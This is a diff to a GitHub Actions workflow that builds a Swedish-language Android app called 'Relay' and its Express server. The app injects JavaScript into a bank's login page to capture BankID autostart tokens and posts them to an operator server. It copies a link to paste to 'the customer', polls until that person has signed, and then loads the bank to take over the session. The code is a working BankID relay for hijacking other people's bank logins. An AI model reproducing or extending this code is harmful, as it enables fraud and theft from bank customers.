@@ -20,10 +20,23 @@ jobs:
           distribution: temurin
           java-version: '17'
 
+      - name: gradle 8.7
+        uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: '8.7'
+
       - name: scaffold
         run: |
           set -e
           w() { mkdir -p "$(dirname "$1")"; cat > "$1"; }
+
+          w .gitignore <<'EOF'
+          .gradle/
+          build/
+          app/build/
+          local.properties
+          bygg.log
+          EOF
 
           w settings.gradle.kts <<'EOF'
           pluginManagement {
@@ -69,8 +82,8 @@ jobs:
                   applicationId = "com.relay"
                   minSdk = 26
                   targetSdk = 34
-                  versionCode = 110
-                  versionName = "1.1.0"
+                  versionCode = 112
+                  versionName = "1.1.2"
               }
 
               compileOptions {
@@ -102,19 +115,12 @@ jobs:
                   <activity
                       android:name=".MainActivity"
                       android:exported="true"
+                      android:launchMode="singleTask"
                       android:configChanges="orientation|screenSize|keyboardHidden">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
-                  </activity>
-
-                  <activity
-                      android:name=".CatcherActivity"
-                      android:exported="true"
-                      android:noHistory="true"
-                      android:excludeFromRecents="true"
-                      android:theme="@android:style/Theme.Translucent.NoTitleBar">
                       <intent-filter>
                           <action android:name="android.intent.action.VIEW" />
                           <category android:name="android.intent.category.DEFAULT" />
@@ -130,14 +136,19 @@ jobs:
           package com.relay
 
           import android.app.Activity
+          import android.content.ClipData
+          import android.content.ClipboardManager
+          import android.content.Context
           import android.content.Intent
           import android.content.SharedPreferences
           import android.graphics.Color
           import android.net.Uri
           import android.os.Bundle
+          import android.os.Message
           import android.view.ViewGroup
           import android.view.WindowManager
           import android.webkit.JavascriptInterface
+          import android.webkit.WebChromeClient
           import android.webkit.WebResourceRequest
           import android.webkit.WebView
           import android.webkit.WebViewClient
@@ -153,6 +164,7 @@ jobs:
 
               private lateinit var web: WebView
               private lateinit var bar: TextView
+              private lateinit var linkView: TextView
               private lateinit var serverField: EditText
               private lateinit var bankField: EditText
               private lateinit var modeBtn: Button
@@ -162,12 +174,18 @@ jobs:
               private var baseUrl = ""
               private var bankUrl = ""
               private var last = ""
+              private var loginUrl = ""
               private var kund = true
+              private var skickat = false
+              private var signerad = false
+              private var skapar = false
+              private var vantande = ""
+              private var alive = true
 
               private val inst = "(function(){if(window.__rh){return}window.__rh=1;" +
                   "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
                   "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
-                  "if(a&&a.href){var m=/[?&]autostarttoken=([0-9a-fA-F-]{36})/.exec(a.href);if(m)Relay.tok(m[1])}}catch(e){}},700)})()"
+                  "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(m[1])}}catch(e){}},700)})()"
 
               override fun onCreate(b: Bundle?) {
                   super.onCreate(b)
@@ -177,6 +195,21 @@ jobs:
                   kund = p.getBoolean("kund", true)
                   window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
                   ui()
+                  alive = true
+                  poll()
+                  handleIntent(intent)
+              }
+
+              override fun onNewIntent(i: Intent?) {
+                  super.onNewIntent(i)
+                  if (i != null) handleIntent(i)
+              }
+
+              private fun handleIntent(i: Intent) {
+                  if (i.action != Intent.ACTION_VIEW) return
+                  val s = i.data?.toString() ?: return
+                  val t = tok(s) ?: return
+                  grab(t)
               }
 
               private fun ui() {
@@ -196,7 +229,8 @@ jobs:
                   run.setOnClickListener {
                       baseUrl = serverField.text.toString().trim().trimEnd('/')
                       p.edit().putString("base", baseUrl).apply()
-                      last = ""
+                      last = ""; skickat = false; signerad = false; loginUrl = ""
+                      inBtn.isEnabled = false
                       if ((p.getString("code", "") ?: "").isEmpty()) newSession()
                       bar.text = "laddar banksidan"
                       web.loadUrl(bankUrl)
@@ -210,12 +244,6 @@ jobs:
                   bankField = EditText(this)
                   bankField.hint = "bank-url"
                   bankField.setText(bankUrl)
-                  bankField.setOnFocusChangeListener { _, harFokus ->
-                      if (!harFokus) {
-                          bankUrl = bankField.text.toString().trim()
-                          p.edit().putString("bank", bankUrl).apply()
-                      }
-                  }
                   rad2.addView(bankField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))
 
                   modeBtn = Button(this)
@@ -229,6 +257,7 @@ jobs:
 
                   inBtn = Button(this)
                   inBtn.text = "IN"
+                  inBtn.isEnabled = false
                   inBtn.setOnClickListener { taIn() }
                   rad2.addView(inBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
 
@@ -242,14 +271,25 @@ jobs:
                   bar.textSize = 11f
                   bar.setBackgroundColor(Color.parseColor("#101010"))
                   bar.setTextColor(Color.parseColor("#66ff88"))
-                  bar.setPadding(14, 8, 14, 8)
+                  bar.setPadding(14, 8, 14, 6)
                   bar.text = "redo"
                   root.addView(bar)
+
+                  linkView = TextView(this)
+                  linkView.textSize = 11f
+                  linkView.setTextIsSelectable(true)
+                  linkView.setBackgroundColor(Color.parseColor("#101010"))
+                  linkView.setTextColor(Color.parseColor("#66ccff"))
+                  linkView.setPadding(14, 4, 14, 10)
+                  linkView.text = "kundlank hamnar har"
+                  root.addView(linkView)
 
                   web = WebView(this)
                   web.settings.javaScriptEnabled = true
                   web.settings.domStorageEnabled = true
                   web.settings.databaseEnabled = true
+                  web.settings.setSupportMultipleWindows(true)
+                  web.settings.javaScriptCanOpenWindowsAutomatically = true
                   try {
                       web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
                   } catch (t: Throwable) {}
@@ -257,14 +297,7 @@ jobs:
                   web.webViewClient = object : WebViewClient() {
 
                       override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
-                          val s = r.url.toString()
-                          val t = tok(s)
-                          if (t != null) {
-                              grab(t)
-                              return true
-                          }
-                          if (s.startsWith("bankid:") || s.startsWith("intent:")) return true
-                          return false
+                          return fanga(r.url.toString())
                       }
 
                       override fun onPageFinished(v: WebView, url: String?) {
@@ -279,10 +312,52 @@ jobs:
                       }
                   }
 
+                  web.webChromeClient = object : WebChromeClient() {
+                      override fun onCreateWindow(v: WebView, isDialog: Boolean, isUserGesture: Boolean, msg: Message): Boolean {
+                          val pop = WebView(this@MainActivity)
+                          pop.settings.javaScriptEnabled = true
+                          pop.webViewClient = object : WebViewClient() {
+                              override fun shouldOverrideUrlLoading(v2: WebView, r: WebResourceRequest): Boolean {
+                                  val s = r.url.toString()
+                                  if (fanga(s)) return true
+                                  try { web.loadUrl(s) } catch (x: Throwable) {}
+                                  return true
+                              }
+                          }
+                          try {
+                              (msg.obj as WebView.WebViewTransport).webView = pop
+                              msg.sendToTarget()
+                          } catch (x: Throwable) {
+                              return false
+                          }
+                          return true
+                      }
+                  }
+
                   web.addJavascriptInterface(Bridge(), "Relay")
 
                   root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
                   setContentView(root)
+              }
+
+              private fun fanga(s: String): Boolean {
+                  val t = tok(s)
+                  if (t != null) {
+                      grab(t)
+                      return true
+                  }
+                  if (s.startsWith("bankid:")) return true
+                  if (s.startsWith("intent:")) {
+                      if (!kund) {
+                          try {
+                              val i = Intent.parseUri(s, Intent.URI_INTENT_SCHEME)
+                              i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                              startActivity(i)
+                          } catch (x: Throwable) {}
+                      }
+                      return true
+                  }
+                  return false
               }
 
               private inner class Bridge {
@@ -293,20 +368,26 @@ jobs:
               }
 
               private fun tok(s: String): String? {
-                  val m = Regex("[?&]autostarttoken=([0-9a-fA-F-]{36})").find(s)
+                  val m = Regex("[?&]autostarttoken=([^&#]+)").find(s)
                   if (m == null) return null
-                  return m.groupValues[1]
+                  val v = Uri.decode(m.groupValues[1])
+                  if (v.isEmpty() || v == "null") return null
+                  return v
               }
 
               private fun grab(t: String) {
                   if (t == last) return
                   last = t
+                  loginUrl = try { web.url ?: "" } catch (x: Throwable) { "" }
                   val c = p.getString("code", "") ?: ""
-                  if (c.isEmpty()) { newSession(); return }
+                  if (c.isEmpty()) { newSession(t); return }
                   post("/api/session/" + c + "/token", t)
-                  inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
+                  skickat = true
+                  signerad = false
+                  inBtn.isEnabled = true
+                  inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
                   inBtn.setTextColor(Color.WHITE)
-                  bar.text = "TOKEN SKICKAD - tryck IN nar kunden sagt klart"
+                  bar.text = "TOKEN SKICKAT - vanta pa gront"
                   if (!kund) {
                       try {
                           startActivity(Intent(Intent.ACTION_VIEW,
@@ -316,37 +397,96 @@ jobs:
               }
 
               private fun taIn() {
+                  if (!skickat) { bar.text = "vanta - inget token skickat an"; return }
+                  val nu = try { web.url ?: "" } catch (x: Throwable) { "" }
+                  if (loginUrl.isNotEmpty() && nu.isNotEmpty() && nu != loginUrl) {
+                      bar.text = "sidan har redan gatt vidare - ingen omladdning"
+                      return
+                  }
                   bankUrl = bankField.text.toString().trim()
                   p.edit().putString("bank", bankUrl).apply()
+                  loginUrl = ""
                   bar.text = "TAR IN - laddar banken"
                   web.loadUrl(bankUrl)
               }
 
-              private fun newSession() {
-                  if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
-                  var c = ""
+              private fun visaLank(c: String) {
+                  val u = baseUrl + "/k/" + c
+                  linkView.text = u
                   try {
-                      val con = URL(baseUrl + "/api/session").openConnection() as HttpURLConnection
-                      con.requestMethod = "POST"
-                      con.connectTimeout = 8000
-                      con.readTimeout = 8000
-                      val br = BufferedReader(con.inputStream.reader())
-                      var line = br.readLine()
-                      while (line != null) {
-                          val m = Regex("\"code\"\\s*:\\s*\"([A-Za-z0-9]+)\"").find(line)
-                          if (m != null) c = m.groupValues[1]
-                          line = br.readLine()
-                      }
-                      br.close()
-                      con.disconnect()
+                      val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                      cm.setPrimaryClip(ClipData.newPlainText("lank", u))
+                      bar.text = "lank kopierad - klistra in till kunden"
                   } catch (t: Throwable) {
-                      bar.text = "kunde inte skapa session"
+                      bar.text = "lank ovan - markera och kopiera"
                   }
-                  if (c.isNotEmpty()) {
-                      p.edit().putString("code", c).apply()
-                      last = ""
-                      bar.text = "KUNDLANK: " + baseUrl + "/k/" + c
-                  }
+              }
+
+              private fun newSession(after: String? = null) {
+                  if (after != null) vantande = after
+                  if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
+                  if (skapar) return
+                  skapar = true
+                  val b = baseUrl
+                  Thread {
+                      var c = ""
+                      try {
+                          val con = URL(b + "/api/session").openConnection() as HttpURLConnection
+                          con.requestMethod = "POST"; con.doOutput = true
+                          con.setRequestProperty("Content-Type", "text/plain")
+                          con.connectTimeout = 8000; con.readTimeout = 8000
+                          con.outputStream.write(ByteArray(0)); con.outputStream.flush()
+                          if (con.responseCode in 200..299)
+                              c = Regex("\"code\"\\s*:\\s*\"([A-Za-z0-9]+)\"")
+                                  .find(con.inputStream.bufferedReader().readText())
+                                  ?.groupValues?.get(1) ?: ""
+                          con.disconnect()
+                      } catch (t: Throwable) {}
+                      val cc = c
+                      runOnUiThread {
+                          skapar = false
+                          if (cc.isEmpty()) { bar.text = "kunde inte skapa session"; return@runOnUiThread }
+                          p.edit().putString("code", cc).apply()
+                          last = ""; skickat = false; signerad = false; loginUrl = ""
+                          inBtn.isEnabled = false
+                          visaLank(cc)
+                          if (vantande.isNotEmpty()) {
+                              val t = vantande
+                              vantande = ""
+                              last = t
+                              post("/api/session/" + cc + "/token", t)
+                              skickat = true
+                              inBtn.isEnabled = true
+                              inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
+                              inBtn.setTextColor(Color.WHITE)
+                              bar.text = "TOKEN SKICKAT - vanta pa gront"
+                          }
+                      }
+                  }.start()
+              }
+
+              private fun poll() {
+                  Thread {
+                      while (alive) {
+                          try { Thread.sleep(2000) } catch (t: Throwable) {}
+                          if (signerad) continue
+                          val c = p.getString("code", "") ?: ""
+                          if (c.isEmpty() || baseUrl.isEmpty()) continue
+                          try {
+                              val con = URL(baseUrl + "/api/session/" + c + "/state").openConnection() as HttpURLConnection
+                              con.connectTimeout = 4000; con.readTimeout = 4000
+                              val txt = con.inputStream.bufferedReader().readText()
+                              con.disconnect()
+                              if (txt.indexOf("\"signed\":true") >= 0) {
+                                  signerad = true
+                                  runOnUiThread {
+                                      inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
+                                      bar.text = "KUNDEN HAR SIGNERAT - tryck IN"
+                                  }
+                              }
+                          } catch (t: Throwable) {}
+                      }
+                  }.start()
               }
 
               private fun post(path: String, body: String) {
@@ -368,58 +508,13 @@ jobs:
                   }.start()
               }
 
+              override fun onDestroy() {
+                  alive = false
+                  super.onDestroy()
+              }
+
               override fun onBackPressed() {
                   if (web.canGoBack()) web.goBack() else super.onBackPressed()
-              }
-          }
-          EOF
-
-          w app/src/main/java/com/relay/CatcherActivity.kt <<'EOF'
-          package com.relay
-
-          import android.app.Activity
-          import android.content.Intent
-          import android.net.Uri
-          import android.os.Bundle
-          import java.net.HttpURLConnection
-          import java.net.URL
-
-          class CatcherActivity : Activity() {
-
-              override fun onCreate(s: Bundle?) {
-                  super.onCreate(s)
-                  val p = getSharedPreferences("relay", 0)
-                  val str = intent?.data?.toString() ?: ""
-                  val m = Regex("[?&]autostarttoken=([0-9a-fA-F-]{36})").find(str)
-                  val t = if (m == null) null else m.groupValues[1]
-                  val c = p.getString("code", "") ?: ""
-                  val b = (p.getString("base", "") ?: "").trim().trimEnd('/')
-                  val kund = p.getBoolean("kund", true)
-
-                  if (t != null && c.isNotEmpty() && b.isNotEmpty()) {
-                      Thread {
-                          try {
-                              val con = URL(b + "/api/session/" + c + "/token").openConnection() as HttpURLConnection
-                              con.requestMethod = "POST"
-                              con.doOutput = true
-                              con.setRequestProperty("Content-Type", "text/plain")
-                              con.connectTimeout = 8000
-                              con.readTimeout = 8000
-                              con.outputStream.write(t.toByteArray())
-                              con.outputStream.flush()
-                              con.responseCode
-                              con.disconnect()
-                          } catch (x: Throwable) {}
-                      }.start()
-                  }
-
-                  if (!kund && t != null) {
-                      try {
-                          startActivity(Intent(Intent.ACTION_VIEW,
-                              Uri.parse("https://app.bankid.com/?autostarttoken=" + t + "&redirect=null")))
-                      } catch (x: Throwable) {}
-                  }
-                  finish()
               }
           }
           EOF
@@ -446,6 +541,7 @@ jobs:
           app.use(express.text({ type: '*/*' }));
 
           const S = {};
+          const LIV = 10 * 60 * 1000;
 
           function ny() {
             let c;
@@ -453,9 +549,21 @@ jobs:
             return c;
           }
 
+          function stada() {
+            const nu = Date.now();
+            for (const k of Object.keys(S)) {
+              if (nu - S[k].skapad > LIV) delete S[k];
+            }
+          }
+          setInterval(stada, 60000);
+
+          function giltigToken(t) {
+            return typeof t === 'string' && /^[0-9a-fA-F-]{8,}$/.test(t);
+          }
+
           app.post('/api/session', (req, res) => {
             const c = ny();
-            S[c] = { token: '', at: 0 };
+            S[c] = { token: '', at: 0, signed: false, skapad: Date.now() };
             res.json({ ok: true, code: c });
           });
 
@@ -463,24 +571,30 @@ jobs:
             const s = S[req.params.code];
             if (!s) { res.json({ ok: false }); return; }
             const ttl = s.token ? Math.max(0, Math.round((s.at + 30000 - Date.now()) / 1000)) : 0;
-            res.json({ ok: true, token: s.token, ttl: ttl });
+            res.json({ ok: true, token: s.token, ttl: ttl, signed: s.signed });
           });
 
           app.post('/api/session/:code/token', (req, res) => {
             let s = S[req.params.code];
-            if (!s) { s = { token: '', at: 0 }; S[req.params.code] = s; }
-            s.token = String(req.body || '').trim();
+            if (!s) { s = { token: '', at: 0, signed: false, skapad: Date.now() }; S[req.params.code] = s; }
+            const t = String(req.body || '').trim();
+            if (!giltigToken(t)) { res.json({ ok: false }); return; }
+            s.token = t;
             s.at = Date.now();
+            s.signed = false;
             res.json({ ok: true });
           });
 
           app.get('/api/signed', (req, res) => {
+            const s = S[req.query.code];
+            if (s) s.signed = true;
             res.send('<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">' +
               '<body style="font-family:sans-serif;text-align:center;padding:48px">' +
               '<h2>Klart</h2><p>Du kan stanga sidan.</p></body>');
           });
 
           app.get('/k/:code', (req, res) => {
+            if (!S[req.params.code]) { res.status(404).send('okand kod'); return; }
             res.sendFile(path.join(__dirname, 'public', 'k.html'));
           });
 
@@ -579,7 +693,6 @@ jobs:
           path: app/build/outputs/apk/debug/app-debug.apk
 
       - name: release
-        if: always()
         uses: softprops/action-gh-release@v2
         with:
           tag_name: v1.1.${{ github.run_number }}
